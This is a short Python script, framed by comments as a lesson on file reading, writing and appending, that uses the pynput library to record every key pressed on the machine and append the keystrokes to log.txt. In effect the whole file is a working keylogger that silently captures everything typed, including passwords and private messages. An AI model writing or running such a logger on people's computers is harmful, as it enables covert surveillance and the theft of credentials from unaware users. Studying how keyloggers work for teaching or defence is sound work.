from pynput.keyboard import Listener


# File Handling:How to read,write and append a file
# r - reading
# w - writing
# a - appending a file

# Use of 'with' keyword - Automatically release memory/resources


def logger(key):
    word = str(key)
    word = word.replace("'", "")

    if word == 'Key.space':
        word = ' '

    if word == 'Key.shift':
        word = ''

    if word == 'Key.shift_r':
        word = ''

    if word == "Key.ctrl_l":
        word = ""

    if word == "Key.enter":
        word = "\n"

    with open("log.txt", 'a') as f:
        f.write(word)


with Listener(on_press=logger) as l:
    l.join()
